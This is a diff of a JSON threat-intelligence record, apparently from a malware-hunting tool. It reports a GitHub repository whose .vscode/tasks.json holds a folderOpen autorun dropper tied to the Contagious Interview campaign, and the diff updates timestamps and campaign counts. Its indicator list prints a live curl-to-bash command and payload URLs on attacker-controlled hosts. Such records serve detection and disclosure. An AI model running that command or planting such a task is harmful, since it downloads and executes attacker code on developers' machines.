@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/sky-cook_tokentradingdapp.json",
     "reviewer_decision": "",
     "notes": ""
@@ -55,7 +55,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/sky-cook/tokentradingdapp",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-config-settings.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-config-settings.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-config-settings.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-config-settings.vercel.app and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-config-settings.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-config-settings.vercel.app.\nFound by GitHub code search for a confirmed malware signature: folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-config-settings.vercel.app and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-config-settings.vercel.app",
     "publisher": "sky-cook",
     "severity_level": "critical",
@@ -73,7 +73,7 @@
     "evidence_references": "https://github.com/sky-cook/tokentradingdapp/blob/191ecaa9d9d879b92147947cb15bb76ad7540538/.vscode/tasks.json\nhttps://github.com/sky-cook/tokentradingdapp/blob/191ecaa9d9d879b92147947cb15bb76ad7540538/app/controllers/settingController.js#L5",
     "verified_iocs": "vscode-config-settings.vercel.app\nhttps://vscode-config-settings.vercel.app/settings/mac?flag=1\nhttps://vscode-config-settings.vercel.app/settings/linux?flag=1\ncurl 'https://vscode-config-settings.vercel.app/settings/mac?flag=1' | bash\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
